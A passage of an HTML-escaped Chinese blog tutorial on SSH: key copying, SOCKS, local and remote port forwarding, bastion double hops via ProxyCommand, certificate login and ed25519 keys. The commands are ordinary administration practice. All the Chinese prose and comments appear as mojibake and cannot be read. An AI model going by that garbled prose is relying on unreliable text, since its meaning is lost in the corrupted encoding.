&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -i id_rsa å‚æ•°å¯ä»¥çœç•¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-copy-id -i id_rsa user@svr
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>åˆ©ç”¨ ssh æ‰§è¡Œè¿œç¨‹å‘½ä»¤ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cat ~/.ssh/id_rsa.pub &lt;span class="p">|&lt;/span> ssh user@svr &lt;span class="s2">&amp;#34;mkdir -p ~/.ssh &amp;amp;&amp;amp; cat &amp;gt;&amp;gt; ~/.ssh/authorized_keys&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç™»é™†æœåŠ¡å™¨ï¼Œç„¶åå°†å…¬é’¥æ‰‹åŠ¨ç²˜è´´åˆ°æœåŠ¡å™¨ç«¯ã€‚&lt;/p>
&lt;h2 id="ç«¯å£è½¬å‘">ç«¯å£è½¬å‘&lt;/h2>
&lt;h3 id="åŠ¨æ€ç«¯å£è½¬å‘">åŠ¨æ€ç«¯å£è½¬å‘&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -D: æŒ‡å®šæœ¬åœ°è¦è½¬å‘çš„ç«¯å£ï¼Œä½¿ç”¨ SOCSOCKS4/SOCKS5 åè®®&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -N: è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºç«¯å£è½¬å‘&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -D &lt;span class="m">1080&lt;/span> svr -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åˆ©ç”¨ä¸Šè¿°å»ºç«‹çš„ SOCSOCKS4/SOCKS5 æœåŠ¡æ¥è·å–æ•°æ®ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">curl -x socks5://localhost:1080 &amp;lt;https://www.google.com/&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æœ¬åœ°ç«¯å£è½¬å‘">æœ¬åœ°ç«¯å£è½¬å‘&lt;/h3>
&lt;p>è½¬å‘åˆ°å…¶ä»–æœºå™¨ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å»ºç«‹ä»æœ¬æœº 11111 ç«¯å£åˆ° www.baidu.com:80 çš„åŠ å¯†éš§é“ï¼Œé€šè¿‡ svr ssh æœåŠ¡å™¨åšä¸­è½¬&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -f: åå°è¿è¡Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -NfL 11111:www.baidu.com:80 svr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è®¿é—®æœ¬æœºçš„ 11111 ç«¯å£ï¼Œç›¸å½“äºé€šè¿‡ svr è®¿é—® www.baidu.com:80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è¿™é‡Œéœ€è¦è®¾ç½® host header, å¦åˆ™ç™¾åº¦ä¼šæ‹’ç»è®¿é—®&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl --header &lt;span class="s1">&amp;#39;Host: www.baidu.com&amp;#39;&lt;/span> localhost:11111
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è½¬å‘åˆ° ssh æœåŠ¡å™¨æœ¬æœºçš„å…¶ä»–ç«¯å£ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># svr çš„ 8118 ç«¯å£ä¸Šå¯åŠ¨ä¸€ä¸ª http ä»£ç†æœåŠ¡å™¨ï¼Œä¾‹å¦‚ privoxy/squid/varnish ç­‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -NfL 11111:localhost:8118 svr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æœ¬æœºçš„ 11111 ç«¯å£ï¼Œå¯ä»¥ä½œä¸ºä»£ç†ç«¯å£æ¥ä½¿ç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -x http://localhost:11111 www.google.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="è¿œç¨‹ç«¯å£è½¬å‘">è¿œç¨‹ç«¯å£è½¬å‘&lt;/h3>
&lt;p>&lt;strong>è¿œç¨‹ç«¯å£è½¬å‘&lt;/strong> å’Œ &lt;strong>æœ¬åœ°ç«¯å£è½¬å‘&lt;/strong> åˆšå¥½ç›¸åï¼Œæœ¬åœ°è½¬å‘æ˜¯ &lt;strong>æœ¬åœ°è®¡ç®—æœºé€šè¿‡
åŠ å¯†éš§é“è®¿é—®è¿œç¨‹ä¸»æœº&lt;/strong>, è€Œè¿œç¨‹è½¬å‘æ˜¯ &lt;strong>è¿œç¨‹ä¸»æœºé€šè¿‡åŠ å¯†éš§é“è®¿é—®æœ¬æœºè®¡ç®—
æœº&lt;/strong> ã€‚&lt;/p>
&lt;p>ä¸‹é¢é€šè¿‡ä¸¤ä¸ªæ¡ˆä¾‹æ¥å…·ä½“ä»‹ç»å…¶ç”¨æ³•ã€‚&lt;/p>
&lt;h3 id="æ¡ˆä¾‹ä¸€å°†å†…ç½‘çš„æŸä¸ªæœåŠ¡æ˜ å°„åˆ°å¤–ç½‘æœåŠ¡å™¨ä¸Š">æ¡ˆä¾‹ä¸€ï¼šå°†å†…ç½‘çš„æŸä¸ªæœåŠ¡æ˜ å°„åˆ°å¤–ç½‘æœåŠ¡å™¨ä¸Š&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å°† my.public.svr:80 æ˜ å°„åˆ° 192.168.1.10:8080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¤–ç½‘è®¿é—® my.public.svr:80 å³å¯è®¿é—®åˆ°å†…ç½‘çš„ 192.168.1.10:8080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -R 80:192.168.1.10:8080 my.public.svr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å°† my.public.svr:8080 æ˜ å°„åˆ°æœ¬æœºçš„ 80 ç«¯å£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -R 8080:localhost:80 my.public.svr
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æ¡ˆä¾‹äºŒå°†å†…ç½‘æœåŠ¡å™¨é€šè¿‡-ssh-è·³æ¿æœºæ˜ å°„åˆ°æœ¬æœº">æ¡ˆä¾‹äºŒï¼šå°†å†…ç½‘æœåŠ¡å™¨é€šè¿‡ ssh è·³æ¿æœºæ˜ å°„åˆ°æœ¬æœº&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åœ¨ ssh è·³æ¿æœºä¸Šæ‰§è¡Œï¼Œå‡è®¾ 192.168.1.10 ä¸ºæœ¬æœº IP åœ°å€ï¼ˆå‰ææ˜¯æœ¬æœºè£…æœ‰ sshd æœåŠ¡ï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä¹‹ååœ¨æœ¬æœºæ‰§è¡Œ ssh -p 2222 localhost å³å¯ç™»é™† my.private.svr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -R 2222:my.private.svr:22 192.168.1.10
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="åˆ©ç”¨ç«¯å£è½¬å‘åš-ssh-äºŒæ¬¡è·³è½¬">åˆ©ç”¨ç«¯å£è½¬å‘åš ssh äºŒæ¬¡è·³è½¬&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>å»ºç«‹ localhost åˆ° host1 çš„éš§é“&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ssh -L 9999:host2:1234 -N host1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ³¨æ„ï¼Œè¿™é‡Œ host1 åˆ° host2 çš„è¿æ¥æ˜¯éåŠ å¯†çš„ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å»ºç«‹ localhost åˆ° host1 çš„éš§é“ï¼ŒåŒæ—¶å»ºç«‹ host1 åˆ° host2 çš„éš§é“&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ssh -L 9999:localhost:9999 host1 ssh -L 9999:localhost:1234 -N host2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>host1 åˆ° host2 çš„è¿æ¥ä¹Ÿæ˜¯åŠ å¯†çš„ï¼Œä½†æ˜¯ host1:9999 åˆ° host2:1234 çš„éš§
é“å¯ä»¥è¢« host1 ä¸Šçš„ä»»æ„ç”¨æˆ·ä½¿ç”¨ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å»ºç«‹ localhost åˆ° host1 çš„éš§é“ï¼Œå†å»ºç«‹ localhost åˆ° host2 çš„éš§é“&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è½¬å‘æœ¬æœº 9998 ç«¯å£åˆ° host2:22&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -L 9998:host2:22 -N host1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># é€šè¿‡ 9998 ç«¯å£è¿æ¥ host2 çš„ sshd, å¹¶è½¬å‘æœ¬æœºç«¯å£ 9999 åˆ° host2:1234&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh -L 9999:localhost:1234 -N -p &lt;span class="m">9998&lt;/span> localhost
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚æœ 1234 æœåŠ¡åªèƒ½é€šè¿‡ host2 æœ¬æœºè®¿é—®ï¼Œåˆ™å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥é—´æ¥è®¿é—®
è¯¥æœåŠ¡ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>å‚è€ƒï¼š&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://superuser.com/a/97007/869637">An SSH tunnel via multiple hops - Super User&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://stackoverflow.com/questions/5847814/emacs-tramp-ssh-double-hop">Emacs Tramp ssh double hop - Stack Overflow&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="åˆ©ç”¨ä»£ç†å‘½ä»¤åš-ssh-äºŒæ¬¡è·³è½¬---double-hop">åˆ©ç”¨ä»£ç†å‘½ä»¤åš ssh äºŒæ¬¡è·³è½¬ - double hop&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">Host endpoint2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> User myusername
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> HostName mysite.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Port &lt;span class="m">3000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ProxyCommand ssh endpoint1 nc -w300 %h %p
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host endpoint1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> User somename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> HostName otherdomainorip.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Port &lt;span class="m">6893&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ‰§è¡Œ &lt;code>ssh endpoint2&lt;/code> ä¼šè‡ªåŠ¨é€šè¿‡è·³æ¿æœº endpoint1 æ¥ç™»é™† endpoint2 ã€‚&lt;/p>
&lt;p>å¦è§ &lt;a href="https://mincodes.com/posts/ssh-usage/#åˆ©ç”¨ç«¯å£è½¬å‘åš-ssh-äºŒæ¬¡è·³è½¬">ssh å¸¸è§ç”¨æ³•ä»‹ç»&lt;/a> ã€‚&lt;/p>
&lt;h2 id="ssh-è¯ä¹¦ç™»é™†">ssh è¯ä¹¦ç™»é™†&lt;/h2>
&lt;h3 id="è¯ä¹¦ç­¾å‘">è¯ä¹¦ç­¾å‘&lt;/h3>
&lt;p>è¦ä½¿ç”¨è¯ä¹¦ç™»é™†ï¼Œé¦–å…ˆéœ€è¦ä¸ºæœåŠ¡å™¨ã€ç”¨æˆ·ç«¯åˆ†åˆ«ç­¾å‘è¯ä¹¦ã€‚&lt;/p>
&lt;p>CA å¯†é’¥ï¼š&lt;/p>
&lt;ul>
&lt;li>CA è¦ç­¾å‘è¯ä¹¦ï¼Œé¦–å…ˆéœ€è¦ä¸€å¯¹å¯†é’¥ï¼Œå¯ä»¥é€šè¿‡ ssh-keygen æ¥ç”Ÿæˆå¯†é’¥å¯¹&lt;/li>
&lt;li>è€ƒè™‘åˆ°å®‰å…¨æ€§å’Œçµæ´»æ€§ï¼Œåœ¨ç­¾å‘æœåŠ¡å™¨è¯ä¹¦å’Œç”¨æˆ·è¯ä¹¦æ—¶ï¼Œå¯ä»¥åˆ†åˆ«ä½¿ç”¨ä¸¤å¯¹
ä¸åŒçš„å¯†é’¥ï¼Œè¿™é‡Œåˆ†åˆ«ç§°ä¸º ca-server å¯†é’¥å¯¹å’Œ ca-user å¯†é’¥å¯¹&lt;/li>
&lt;/ul>
&lt;p>ç­¾å‘è¯ä¹¦ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç­¾å‘ ssh æœåŠ¡å™¨è¯ä¹¦ï¼š&lt;/p>
&lt;p>ä½¿ç”¨ ca-server ç§é’¥ + æœåŠ¡å™¨å…¬é’¥ + å…¶ä»–ä¿¡æ¯ï¼ˆåŸŸåï¼Œidentity, æœ‰æ•ˆæœŸ
ç­‰ï¼‰ï¼Œç”ŸæˆæœåŠ¡å™¨è¯ä¹¦ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç­¾å‘ ssh ç”¨æˆ·è¯ä¹¦ï¼š&lt;/p>
&lt;p>ä½¿ç”¨ ca-user ç§é’¥ + ç”¨æˆ·å…¬é’¥ + å…¶ä»–ä¿¡æ¯ï¼ˆidentity, æœ‰æ•ˆæœŸç­‰ï¼‰ï¼Œç”Ÿæˆ
ç”¨æˆ·è¯ä¹¦ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¯ä¹¦å¯ä»¥é€šè¿‡ identity æ¥æ’¤é”€ï¼ˆrevokeï¼‰ï¼Œæˆ–è€…é€šè¿‡æŒ‡å®š public key æ¥
revoke&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="è¯ä¹¦é…ç½®">è¯ä¹¦é…ç½®&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>é…ç½®æœåŠ¡å™¨è¯ä¹¦ï¼šé€šè¿‡ sshd_config çš„ HostCertificate å­—æ®µæ¥è¿›è¡Œé…
ç½®ï¼›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>é…ç½®ç”¨æˆ·è¯ä¹¦ï¼šæ‹·è´åˆ°ç”¨æˆ·çš„ ~/.ssh/ ç›®å½•å³å¯ï¼›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æœåŠ¡å™¨ä¿¡ä»»ç”¨æˆ·è¯ä¹¦ï¼š&lt;/p>
&lt;p>é€šè¿‡ sshd_config çš„ TrustedUserCAKeys å­—æ®µï¼Œé…ç½®æœåŠ¡å™¨ä¿¡ä»»çš„
ca-user å…¬é’¥ã€‚å³æœåŠ¡å™¨ä¼šä¿¡ä»»ç”± TrustedUserCAKeys æŒ‡å®šçš„æ–‡ä»¶é‡Œçš„å…¬
é’¥æ‰€ç­¾å‘çš„ç”¨æˆ·è¯ä¹¦ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®¢æˆ·ç«¯ä¿¡ç”¨æœåŠ¡å™¨è¯ä¹¦ï¼š&lt;/p>
&lt;p>åœ¨ ~/.ssh/known_hosts ä¸­å¢åŠ ä¸€è¡Œï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">@cert-authority * ssh-rsa &amp;lt;ca-server-public-key&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;ca-server-public-key> æ›¿æ¢æˆ ca-server å…¬é’¥å³å¯ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="ssh-è¯ä¹¦ç™»é™†æµç¨‹">ssh è¯ä¹¦ç™»é™†æµç¨‹&lt;/h3>
&lt;p>å¤§è‡´çš„ ssh è¯ä¹¦ç™»é™†æµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š&lt;/p>
&lt;ol>
&lt;li>ç”¨æˆ·ç™»é™† ssh æœåŠ¡å™¨ï¼Œssh å®¢æˆ·ç«¯è‡ªåŠ¨å°†ç”¨æˆ·è¯ä¹¦å‘ç»™æœåŠ¡å™¨&lt;/li>
&lt;li>æœåŠ¡å™¨æ ¡éªŒç”¨æˆ·è¯ä¹¦æ˜¯å¦å¯ä¿¡å’Œæœ‰æ•ˆï¼ŒéªŒè¯é€šè¿‡åï¼Œå°†æœåŠ¡å™¨è¯ä¹¦å‘ç»™ç”¨æˆ·ä¾§&lt;/li>
&lt;li>ç”¨æˆ·ä¾§æ ¡éªŒæœåŠ¡å™¨è¯ä¹¦æ˜¯å¦å¯ä¿¡å’Œæœ‰æ•ˆï¼ŒéªŒè¯é€šè¿‡åï¼Œèµ°æ­£å¸¸ç™»é™†æµç¨‹&lt;/li>
&lt;/ol>
&lt;h2 id="ssh-æœåŠ¡ç«¯é…ç½®æ–‡ä»¶">ssh æœåŠ¡ç«¯é…ç½®æ–‡ä»¶&lt;/h2>
&lt;p>å¸¸ç”¨é…ç½®ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># /etc/ssh/sshd_config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Port &lt;span class="m">2222&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç¦æ­¢å¯†ç ç™»é™†&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PasswordAuthentication no
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ä½¿ç”¨-ed25519-key">ä½¿ç”¨ ed25519 key&lt;/h2>
&lt;p>ç”Ÿæˆ ed25519 key&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç”Ÿæˆ keyï¼Œ-a æŒ‡å®š KDF round æ•°é‡ï¼Œé»˜è®¤ 16ï¼Œè¶Šé«˜ passphrase è¶Šéš¾ç ´è§£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-keygen -a &lt;span class="m">100&lt;/span> -t ed25519 -f ~/.ssh/id_ed25519 -C &lt;span class="s2">&amp;#34;min@mincodes.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># add key to ssh-agent&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-add ~/.ssh/id_ed25519
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># add all keys to ssh-agent&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ssh-key-ç”¨äºç­¾å">ssh key ç”¨äºç­¾å&lt;/h2>
&lt;h3 id="git-ç­¾å">git ç­¾å&lt;/h3>
&lt;p>&lt;a href="https://calebhearth.com/sign-git-with-ssh">https://calebhearth.com/sign-git-with-ssh&lt;/a>&lt;/p>
&lt;h3 id="æ–‡ä»¶ç­¾å">æ–‡ä»¶ç­¾å&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç­¾å&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -n å‚æ•°æŒ‡å®š namespaceï¼Œè¡¨è¾¾ç­¾åçš„ç›®çš„&lt;/span>
